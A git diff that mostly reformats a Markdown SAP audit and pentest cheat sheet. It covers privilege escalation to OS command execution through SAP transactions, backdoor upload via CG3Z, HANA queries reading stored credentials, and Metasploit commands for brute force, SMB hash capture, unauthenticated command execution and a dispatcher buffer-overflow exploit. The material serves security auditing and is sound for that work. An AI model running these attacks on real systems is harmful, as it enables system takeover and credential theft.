@@ -105,9 +105,9 @@ Parameters					Description
 * login/password_max_idle_initial		Maximum #days a password (set by the admin) can be unused (idle)
 * login/password_max_idle_productive		maximum #days a password (set by the user) can be unused (idle)
 ```
-</br>
+ 
 > Notes: 
-> The administration of security policies can be performed via the transaction SECPOL, which is secured by two authorization objects: S_SECPOL is checked during the maintenance of the policies themselves, while S_SECPOL_A is used to define the values that may be assigned to the security policy attributes.
+The administration of security policies can be performed via the transaction SECPOL, which is secured by two authorization objects: S_SECPOL is checked during the maintenance of the policies themselves, while S_SECPOL_A is used to define the values that may be assigned to the security policy attributes.
 Easy ways to see which users have security policies assigned to them:
 + Option 1:  SUIM: “Users > by Complex Selection Criteria” or “Users > by Logon Date and Password Change”
 + Option 2: Directly in table USR02 (field SECURITY_POLICY).
@@ -336,7 +336,7 @@ All the OS commands are executed by a local OS account « <SID>adm » which is u
 If a malevolent person can execute any commands on the server(s) hosting a SAP application/instance with the « <SID>adm » account, then he/she can take over the entire SAP ERP application and data (OS => Database => Application).
 
 ```
-[Privesc Technique 1] Execute any OS commands on the server hosting the SAP application/instance using the transaction SA38 and the report "RSBDCOS0"
+[Privesc technique 1] Execute any OS commands on the server hosting the SAP application/instance using the transaction SA38 and the report "RSBDCOS0"
 > Go to transaction SA38 (Execute ABAP program/report)
 > Run the report "RSBDCOS0"
 > Execute any OS commands 
@@ -347,7 +347,7 @@ If a malevolent person can execute any commands on the server(s) hosting a SAP a
 + Defense tips: Disable the CALL ‘SYSTEM’ command setting the profile parameter ‘rdisp/call_system’ to ‘0’.
 ```
 ```
-[Technique 2] Execute any OS commands on the server hosting the SAP application/instance using the transactions « SM69 + SM49 » or « SM69 + SM36 » or « SM69 + SM37 » 
+[Privesc technique 2] Execute any OS commands on the server hosting the SAP application/instance using the transactions « SM69 + SM49 » or « SM69 + SM36 » or « SM69 + SM37 » 
 > Go to SM69 (Maintain external OS commands)
 > Then create a new external command or edit an existing one
 > Then set and save the OS command that you want to run
@@ -361,7 +361,7 @@ If a malevolent person can execute any commands on the server(s) hosting a SAP a
 + Useful links: https://blogs.sap.com/2013/10/29/secure-execution-of-os-commands-by-abap-programs/
 ```
 ```
-[Technique 3] Execute pre-defined/limited OS commands on the server hosting the SAP application/instance using the transactions SM49 or SM36 or SM37 
+[Privesc technique 3] Execute pre-defined/limited OS commands on the server hosting the SAP application/instance using the transactions SM49 or SM36 or SM37 
 Note: In some cases by using the transactions CG3Z (File upload), CG3Y (File upload) and AL11 (SAP OS Directory and file browser) in addition to either SM49 or SM36 or SM37 it is possible to execute any OS commands.
 For example, if one of the pre-defined or customized OS commands available is to execute a script or a binary, then the following attack scenario is possible:
 > Go to CG3Y (File download)
@@ -377,7 +377,7 @@ For example, if one of the pre-defined or customized OS commands available is to
 > Finally use CG3Z to replace your malicious script (or binary) by the legitimate one.
 ```
 ```
-[Technique 4] Execute any OS commands on the server hosting the SAP application/instance using the transaction(s) SE38 or « SE38 + SA38 » or « SE38 + SM36 » or « SE38 + SM37 » 
+[Privesc technique 4] Execute any OS commands on the server hosting the SAP application/instance using the transaction(s) SE38 or « SE38 + SA38 » or « SE38 + SM36 » or « SE38 + SM37 » 
    > Go to SE38 (ABAP editor - create/edit/run ABAP program)
    > Create a new ABAP program (but you will need a developer key if you don't have a "developer" account)
    > Then execute it using either:
@@ -390,11 +390,11 @@ For example, if one of the pre-defined or customized OS commands available is to
        SM37 (Extended job selection/scheduler)
 ```
 ```
-[Technique 5] Upload a backdoor on the server hosting the SAP application/instance using the transaction CG3Z (File upload)
+[Privesc technique 5] Upload a backdoor on the server hosting the SAP application/instance using the transaction CG3Z (File upload)
    > Use CG3Z to overwrite a legitimate script (or binary) with a malicious one that will be more-likely executed later by a legitimate IT admin or a scheduled batch.
 ```
 ```
-[Technique 6] Execute any OS commands on the server hosting the SAP database using the transaction ST04 (remote OS command execution using Oracle or MSSQL database’s stored procedures)
+[Privesc technique 6] Execute any OS commands on the server hosting the SAP database using the transaction ST04 (remote OS command execution using Oracle or MSSQL database’s stored procedures)
 ```
 
 #### SAP privilege escalation attack using remote OS commands
@@ -650,23 +650,22 @@ Notes:
 > SCC4				- (customize it to ztcode) - Administrationdes mandants 
 ```
 
-Weak parameter transactions
-————————————————————————————————————————————
+#### Weak parameter transactions
+```
 Parameter transactions execute an existing transaction delivering pre-defined screen input.
 To determine all unsafe parameter transactions for SE16, SM30… you need to search for PARAMs matching "/N<TCD>" (e.g. "/NSM30*") in the table TSTCP.
 => The presence of "/*" indicates that the first screen is skipped and thus the view name cannot be overridden.
 => The presence of "/N<TCD>" (e.g. "/NSM30*") indicates that the first screen is not skipped and thus the pre-filled view name can be overridden (leaving the choice of the actual view name up to the user).
 Sources:
-https://www.daniel-berlin.de/security/sap-sec/table-authorizations/
-https://www.daniel-berlin.de/security/sap-sec/weak-parameter-transactions-sap/
+- https://www.daniel-berlin.de/security/sap-sec/table-authorizations/
+- https://www.daniel-berlin.de/security/sap-sec/weak-parameter-transactions-sap/
+```
 
+-------------------
+### 08. [Audit & Pentest] SAP Hana Database security configuration review (SAP database layer)
 
-========================================================================================================================================================
-#### 08. [Audit & Pentest] SAP Hana Database security configuration review (SAP database layer)
-========================================================================================================================================================
-
-List of useful SQL queries to extract the database configuration (e.g. list of users, roles, privileges, password policy, logs)
-——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
+#### List of useful SQL queries to extract the database configuration (e.g. list of users, roles, privileges, password policy, logs)
+```
 'SELECT * FROM SYS.USERS LIMIT 500'
 'SELECT * FROM SYS.USERS_PARAMETERS LIMIT 500'
 'SELECT * FROM SYS.M_PASSWORD_POLICY'
@@ -684,10 +683,10 @@ List of useful SQL queries to extract the database configuration (e.g. list of u
 'SELECT * FROM SYS.M_HOST_INFORMATION'
 'SELECT * FROM SYS.M_INIFILE_CONTENTS' 
 'SELECT * FROM usr02;'
+```
 
-How to log into the database to extract the configuration
-——————————————————————————————————————————————————————————
-
+#### How to log into the database to extract the configuration
+```
 > [Option 1] The SAP HANA configuration can be collected using a “SAP Basis” account with the ‘ST04’ and ‘DBxx’ transactions
 
 > [Option 2] Use SAP HANA HDBSQL to execute SQL commands at OS level.
@@ -715,21 +714,17 @@ How to log into the database to extract the configuration
 	> hdbsql -U SUPER "SELECT * FROM SYS.P_CREDENTIALS_" ;
 	> hdbsql -u SYSTEM -n HOSTNAME:34215 -s EEP -sslprovider commoncrypto -sslkeystore $SECUDIR/sapsrv.pse -ssltruststore $SECUDIR/sapsrv.pse "SELECT * FROM SYS.P_CREDENTIALS_" ; 
 
-
 	Note:
 	"A user administrator can exclude users from this password check with the following SQL statement: ALTER USER <user_name> DISABLE PASSWORD LIFETIME.
 	 However, this is recommended only for technical users only, not database users that correspond to real people.
 	 A user administrator can re-enable the password lifetime check for a user with the following SQL statement: ALTER USER <user_name> ENABLE PASSWORD LIFETIME."
+```
 
+-------------------
+### 09. [Pentest] SAP penetration testing using NMAP and the Metasploit framework
 
-========================================================================================================================================================
-#### 09. [Pentest] SAP penetration testing using NMAP and the Metasploit framework
-========================================================================================================================================================
-
-
-SAP Discovery using NMAP (network port scanner - https://nmap.org)
-——————————————————————————————————————————————————————————————————
-
+#### SAP Discovery using NMAP (network port scanner - https://nmap.org)
+```
 > root@kali-linux$ nmap -sS -sV -v -p- 10.13.34.12
 
 	<SNIP>
@@ -792,11 +787,10 @@ SAP Discovery using NMAP (network port scanner - https://nmap.org)
 	|       Reporting
 	|     References:
 	|_      https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm
+```
 
-
-
-SAP Discovery using NMAP custom probes for better detecting SAP services (https://github.com/gelim/nmap-erpscan)
-———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
+#### SAP Discovery using NMAP custom probes for better detecting SAP services (https://github.com/gelim/nmap-erpscan)
+```
 => https://github.com/gelim/nmap-erpscan/blob/master/sap_ports.py
 
 > root@kali-linux$ nmap -p $(sap_ports.py) 10.3.3.7 -sV --open
@@ -818,18 +812,18 @@ SAP Discovery using NMAP custom probes for better detecting SAP services (https:
 	50113/tcp open  sapstartservice SAP Maganement Console (SID J45, NR 01)
 	50114/tcp open  tcpwrapped
 	Service Info: Host: java745
-	
+ ```
 
-SAP Discovery using Metasploit (Module 'sap_service_discovery' - https://www.metasploit.com)
-—————————————————————————————————————————————————————————————————————————————————————————————
+#### SAP Discovery using Metasploit (Module 'sap_service_discovery' - https://www.metasploit.com)
+```
 Module to perform network scans against SAP platforms, which can be found under modules/ auxiliary/scanner/sap/sap_service_discovery.rb: 
 msf  > use auxiliary/scanner/sap/sap_service_discovery.
 msf  > set RHOST 192.168.1.149
 msf  > exploit
+```
 
-
-SAP Router
-————————————————————————————————————————————
+#### SAP Router
+```
 Module to launch a port scanner through an SAProuter. 
 The module is available on modules/auxiliary/scanner/sap/sap_router_portscanner.rb and allows two types of working modes: 
 * SAP_PROTO: Allows port scanning when S(ecure) entries are set in the SAProuter ACL configuration. 
@@ -842,10 +836,10 @@ In order to ping the ICF component from the exterior and get basic information a
 Discovering ICF services with the mentioned module is as easy as shown below: 
 msf > use auxiliary/scanner/sap/sap_icm_urlscan
 msf auxiliary(sap_icm_urlscan) > show options
+```
 
-
-Attacking the SOAP RFC with Metasploit (e.g.password brute-force, remote OS command execution)
-————————————————————————————————————————————————————————————————————————————————————————————
+#### Attacking the SOAP RFC with Metasploit (e.g.password brute-force, remote OS command execution)
+```
 When enabled, this service allows remote execution of ABAP programs and functions via HTTP SOAP requests. 
 This RFC calling mechanism is protected by HTTP Basic headers (valid SAP credentials are needed), and communications encryption is provided only when HTTPS is enabled. 
 
@@ -911,10 +905,10 @@ exploits/multi/sap/sap_soap_rfc_ sxpg_call_system_exec.rb
 exploits/multi/sap/sap_soap_rfc_ sxpg_command_exec.rb 
 > Attempts to attack command injection issues on SXPG_ COMMAND_EXECUTE to externally execute a Metasploit payload on the remote system.
   Valid SAP credentials are required. 
+```
 
-
-SMB Relay attacks using Metasploit
-————————————————————————————————————————————
+#### SMB Relay attacks using Metasploit
+```
 There is also an interesting attack that can target different SAP functions and is reachable via the SOAP RFC or other components
 such as those in the J2EE engine—more about that later. 
 While handling names, a lot of functions are vulnerable to SMB Relay Attacks. 
@@ -923,10 +917,10 @@ These attacks send an UNC path pointing to a server capturing SMB hashes, which 
 > Some SMB Relay Attack attacks, both unauthenticated and authenticated, have been collected by @nmonkee in an auxiliary module located
   at /auxiliary/scanner/sap/sap_smb_relay.rb. 
 > Module to run to capture the SMB Hashs (LMhash and NTHash): auxiliary/server/capture/smb module capturing SMB hashes 
+```
 
-
-SAP Web interface password brute-force using Metasploit
-—————————————————————————————————————————————————————————
+#### SAP Web interface password brute-force using Metasploit
+```
 Launch brute force attacks against the Web GUI with the module : auxiliary/scanner/sap/sap_web_gui_brute_login.rb
 
 msf > use auxiliary/scanner/sap/sap_web_gui_brute_login
@@ -944,19 +938,20 @@ msf auxiliary(sap_web_gui_brute_login) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(sap_web_gui_brute_login)
+```
 
-
-SAP Portal - J2EE engine exploits
-————————————————————————————————————
+#### SAP Portal - J2EE engine exploits
+```
 Alexander Polyakov and Dmitry Chastuhin presented work on the J2EE engine (SAPocalypse NOW: Crushing SAP’s J2EE Engine and Breaking SAP Portal). 
 Attacks from the above presentations have been published as Metasploit modules: 
 + @nmonkee implemented the VERB tampering bypass (use HEAD as opposed to GET) to attack the ConfigServlet and create an operating system account. 
    > The module can be found at modules/auxiliary/scanner/sap/sap_ctc_verb_ tampering_user_mgmt.rb.  
 + Andras Kabai implemented the ConfigServlet attack to execute arbitrary commands without authentication. 
    > The module can be found at modules/exploits/windows/http/sap_con gservlet_exec_no_auth.rb.  
+```
 
-Attacking the SAP Management Console with Metasploit 
-————————————————————————————————————————————————————————
+#### Attacking the SAP Management Console with Metasploit 
+```
 Attack of the SAP MC SOAP interface to retrieve a lot of interesting information about an SAP system :
 
 modules/auxiliary/scanner/sap/sap_mgmt_con_abaplog.rb 
@@ -998,10 +993,10 @@ modules/auxiliary/scanner/sap/sap_mgmt_con_version.rb
 modules/exploits/windows/http/sap_mgmt_con_osexec_ payload.rb 
 > Attacks the OSExecute functionality on the SAP Management Console to run arbitrary commands and finally a Metasploit payload.
  SAP Management Console credentials are required. 
+```
 
-
-Exploiting SAPHostControl with Metasploit 
-————————————————————————————————————————————
+#### Exploiting SAPHostControl with Metasploit 
+```
 The component that provides the SOAP endpoint for the SAP Management Console on the TCP/50013 for the default instance is startsrv. 
 
 According to the SAP documentation, the executable sapstartsrv runs in host mode for monitoring purposes only.
@@ -1025,12 +1020,13 @@ msf auxiliary(sap_hostctrl_getcomputersystem) > run
 msf auxiliary(sap_hostctrl_getcomputersystem) > set verbose true
 verbose => true
 msf auxiliary(sap_hostctrl_getcomputersystem) > run
-	
+```	
 
-SAP NetWeaver Dispatcher
-————————————————————————————————————————————
+#### SAP NetWeaver Dispatcher
+```
 The disp+work.exe process is vulnerable to a buffer over ow (CVE-2012-2611) while handling Traces, which can be exploited with metasploit Module modules/exploits/windows/misc/sap_netweaver_dispatcher.rb: 
 msf  exploit(sap_netweaver_dispatcher) > use exploit/windows/misc/sap_netweaver_dispatcher
 msf  exploit(sap_netweaver_dispatcher) > set RHOST 192.168.1.149
 RHOST => 192.168.1.149
 msf  exploit(sap_netweaver_dispatcher) > exploit
+```
